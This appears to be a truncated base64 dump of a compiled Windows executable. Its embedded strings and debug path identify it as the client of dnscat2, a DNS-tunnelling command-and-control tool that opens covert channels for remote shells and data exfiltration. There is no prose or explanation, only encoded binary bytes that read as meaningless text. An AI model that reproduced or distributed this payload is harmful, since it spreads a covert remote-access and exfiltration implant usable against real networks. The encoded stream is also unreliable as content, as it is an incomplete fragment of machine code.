sUNvjemf///////////////wAAAAAAAAAAEhD/gv0K//QAiKFD6yC/fPaQMLAOqI0YEUh5HqF3+XPVzSRr7REQY3jayP+VKxkHAAAAAAAAAAAAAAAAAAAAALG5RsHs3rj+STAkcqvppw/ngJzlGQUhZAAAAAAAAAAAkHMAQAEAAACcdgBAAQAAAPR1AEABAAAAKHkAQAEAAAAAAAAAAAAAAAMUoQAAAAAA////f/////////////////////8AAAAAAAAAAAAAAABXInXK064n+cj0AQAAAAAAAAAAAAEAAAAAAAAAAAAAAIL8yxO5i8NoiWlkRihz9Y5otZZKAAAAADL7xXo3USMEEsncWX2UaDFVKKYjAAAAAAAAAAAAAAAAAAAAAAAAAABF+mXFrdTUgZ/4rGWLer1U/L6XHAAAAAAAAAAAAAAAAJBzAEABAAAAnHYAQAEAAAD0dQBAAQAAALR3AEABAAAAAAAAAAAAAAABAAAAAAAAAIKAAAAAAAAAioAAAAAAAIAAgACAAAAAgIuAAAAAAAAAAQAAgAAAAACBgACAAAAAgAmAAAAAAACAigAAAAAAAACIAAAAAAAAAAmAAIAAAAAACgAAgAAAAACLgACAAAAAAIsAAAAAAACAiYAAAAAAAIADgAAAAAAAgAKAAAAAAACAgAAAAAAAAIAKgAAAAAAAAAoAAIAAAACAgYAAgAAAAICAgAAAAAAAgAEAAIAAAAAACIAAgAAAAIDUBgNAAQAAAOAGA0ABAAAA6AYDQAEAAADwBgNAAQAAAC4uXGxpYnNcZG5zLmMAAABETlMgc2VydmVyIHJldHVybmVkIGFuIHVua25vd24gY2hhcmFjdGVyIGluIHRoZSBzdHJpbmc6IDB4JTAyeAoAQ291bGRuJ3QgcHJvY2VzcyBzdHJpbmcATk9UIElNUExFTUVOVEVEIQoAAAAAAAAAV0FSTklORzogRG9uJ3Qga25vdyBob3cgdG8gcGFyc2UgYW4gYW5zd2VyIG9mIHR5cGUgMHglMDR4IChkaXNjYXJkaW5nKQoAKgAAAAAAAABXQVJOSU5HOiBEb24ndCBrbm93IGhvdyB0byBidWlsZCBhbnN3ZXIgdHlwZSAweCUwMng7IHNraXBwaW5nIQoAV0FSTklORzogRG9uJ3Qga25vdyBob3cgdG8gYnVpbGQgYWRkaXRpb25hbCB0eXBlIDB4JTAyeDsgc2tpcHBpbmchCgAAAAAAQ291bGRuJ3QgZ2V0IHN5c3RlbSBETlMgc2VydmVyOiAlZAoAAAAAAFlvdSBjYW4gdXNlIC0tZG5zIHRvIHNldCBhIGN1c3RvbSBkbnMgc2VydmVyLgoAAENvdWxkbid0IGZpbmQgYW55IHN5c3RlbSBkbnMgc2VydmVycwAAAAAlZC4lZC4lZC4lZAAAAAAALi5cbGlic1xsbC5jAAAAAFdlIGZvcmdvdCB0byBoYW5kbGUgYSBsaW5rZWQtbGlzdCB0eXBlIQoAAAAASU5GTwAAAAAAAAAAV0FSTklORwBFUlJPUgAAAEZBVEFMAAAAW1sgJXMgXV0gOjogAAAAAAoKVW5yZWNvdmVyYWJsZSBlcnJvciBhdCAlczolZDogJXMKCgAAAABPdXQgb2YgbWVtb3J5AAAAUE9TSVhMWV9DT1JSRUNUACVzOiBvcHRpb24gcmVxdWlyZXMgYW4gYXJndW1lbnQgLS0gJWMKAAAlczogaWxsZWdhbCBvcHRpb24gLS0gJWMKAAAAAAAAACVzOiBvcHRpb24gYC0tJXMnIGRvZXNuJ3QgYWxsb3cgYW4gYXJndW1lbnQKAAAAACVzOiBvcHRpb24gYC0tJXMnIHJlcXVpcmVzIGFuIGFyZ3VtZW50CgAlczogdW5yZWNvZ25pemVkIG9wdGlvbiBgJXMnCgAAACVzOiBvcHRpb24gYCVzJyBpcyBhbWJpZ3VvdXMKAAAALi5cbGlic1xzZWxlY3RfZ3JvdXAuYwAAVHJpZWQgdG8gYWRkIHNhbWUgc29ja2V0IHRvIHNlbGVjdF9ncm91cCBtb3JlIHRoYW4gb25jZS4AAAAAAAAAAFRvbyBtYW55IHNvY2tldHMhCgAAAAAAAFRyaWVkIHRvIGFkZCBzYW1lIHBpcGUgdG8gc2VsZWN0X2dyb3VwIG1vcmUgdGhhbiBvbmNlIChvciBjaG9vc2UgYSBwb29yIGlkZW50aWZpZXIpLgAAAABVbmtub3duIFNFTEVDVCByZXN1bHQgd2FzIHJldHVybmVkIGJ5IGEgY2FsbGJhY2suAAAAAAAAAFRyaWVkIHRvIHRyZWF0IGEgREFUQUdSQU0gc29ja2V0IGxpa2UgYSBzdHJlYW0uAFNvbWV0aGluZyBjYXVzZWQgZGF0YSBjb3JydXB0aW9uIChvdmVyZmxvdz8pAAAAAHNlbGVjdF9ncm91cDogY291bGRuJ3Qgc2VsZWN0KCkATm8gbW9yZSBkYXRhIGZyb20gc3RkaW4KAAAAAAAAAABzdGRpbjogQ291bGRuJ3Qgd3JpdGUgdG8gc3RkaW4gcGlwZQAAAAAAc3RkaW46IENvdWxkbid0IGNyZWF0ZSB0aHJlYWQAAAAAAAAAAAAAAFRoZSB1bmRlcmx5aW5nIG5ldHdvcmsgc3Vic3lzdGVtIGlzIG5vdCByZWFkeSBmb3IgbmV0d29yayBjb21tdW5pY2F0aW9uLgoAAAAAAAAAVGhlIHZlcnNpb24gb2YgV2luZG93cyBTb2NrZXRzIHN1cHBvcnQgcmVxdWVzdGVkIGlzIG5vdCBwcm92aWRlZCBieSB0aGlzIHBhcnRpY3VsYXIgV2luZG93cyBTb2NrZXRzIGltcGxlbWVudGF0aW9uLgoAAAAAQSBibG9ja2luZyBXaW5kb3dzIFNvY2tldHMgMS4xIG9wZXJhdGlvbiBpcyBpbiBwcm9ncmVzcy4KAAAAAAAAAAAAAAAAAAAAQSBsaW1pdCBvbiB0aGUgbnVtYmVyIG9mIHRhc2tzIHN1cHBvcnRlZCBieSB0aGUgV2luZG93cyBTb2NrZXRzIGltcGxlbWVudGF0aW9uIGhhcyBiZWVuIHJlYWNoZWQuCgAAAAAAAABUaGUgbHBXU0FEYXRhIHBhcmFtZXRlciBpcyBub3QgYSB2YWxpZCBwb2ludGVyLgoAAAAAAAAAAHRjcDogY291bGRuJ3QgY3JlYXRlIHNvY2tldAAAAAAAQ291bGRuJ3QgZmluZCBob3N0ICVzCgAAdGNwOiBjb3VsZG4ndCBjb25uZWN0IHRvIGhvc3QAAAAlcwoAAAAAAEVycm9yICVkOiAlcwAAAAAlczogAAAAACUwMngAAAAAdWRwOiBjb3VsZG4ndCBjcmVhdGUgc29ja2V0AAAAAAB1ZHA6IGNvdWxkbid0IHNldCBzb2NrZXQgdG8gU09fQlJPQURDQVNUAAAAAAAAAAB1ZHA6IGNvdWxkbid0IHBhcnNlIGxvY2FsIGFkZHJlc3MAAAAAAAAAdWRwOiBjb3VsZG4ndCBiaW5kIHRvIHBvcnQgKGFyZSB5b3UgcnVubmluZyBhcyByb290PykAAAB1ZHA6IGNvdWxkbid0IHNlbmQgZGF0YQBETlMgc29ja2V0IGNsb3NlZCEAAAAAAABUaGUgcmVzcG9uc2UgZGlkbid0IGNvbnRhaW4gdGhlIGRvbWFpbiBuYW1lOiAlcwBUaGUgcmVzcG9uc2Ugd2FzIGp1c3QgdGhlIGRvbWFpbiBuYW1lOiAlcwAAAAAAAAAuLlx0dW5uZWxfZHJpdmVyc1xkcml2ZXJfZG5zLmMAAENvdWxkbid0IGhleC1kZWNvZGUgdGhlIG5hbWUgKG5hbWUgd2FzIGFuIG9kZCBsZW5ndGgpOiAlcwAAAAAAAABDb3VsZG4ndCBoZXgtZGVjb2RlIHRoZSBuYW1lIChjb250YWlucyBub24taGV4IGNoYXJhY3RlcnMpOiAlcwAAZG5zY2F0AABTZW5kaW5nIEROUyBxdWVyeSBmb3I6ICVzIHRvICVzOiVkAAAAAAAARE5TIHJlc3BvbnNlIHJlY2VpdmVkICglZCBieXRlcykAAAAAAAAAAEROUzogUkNPREVfRk9STUFUX0VSUk9SAEROUzogUkNPREVfU0VSVkVSX0ZBSUxVUkUAAAAAAAAARE5TOiBSQ09ERV9OQU1FX0VSUk9SAAAARE5TOiBSQ09ERV9OT1RfSU1QTEVNRU5URUQAAAAAAABETlM6IFJDT0RFX1JFRlVTRUQAAAAAAABETlM6IFVua25vd24gZXJyb3IgY29kZSAoMHglMDR4KQAAAAAAAAAAAAAAAAAAAABETlMgcmV0dXJuZWQgdGhlIHdyb25nIG51bWJlciBvZiByZXNwb25zZSBmaWVsZHMgKHF1ZXN0aW9uX2NvdW50IHNob3VsZCBiZSAxLCB3YXMgaW5zdGVhZCAlZCkuAABUaGlzIGlzIHByb2JhYmx5IGR1ZSB0byBhIEROUyBlcnJvcgAAAAAARE5TIGRpZG4ndCByZXR1cm4gYW4gYW5zd2VyAAAAAABSZWNlaXZlZCBhIFRYVCByZXNwb25zZTogJXMAAAAAAFJlY2VpdmVkIGEgQ05BTUUgcmVzcG9uc2U6ICVzAAAAUmVjZWl2ZWQgYSBNWCByZXNwb25zZTogJXMAAAAAAABSZWNlaXZlZCBhIE1YIHJlc3BvbnNlICglenUgYnl0ZXMpAAAAAA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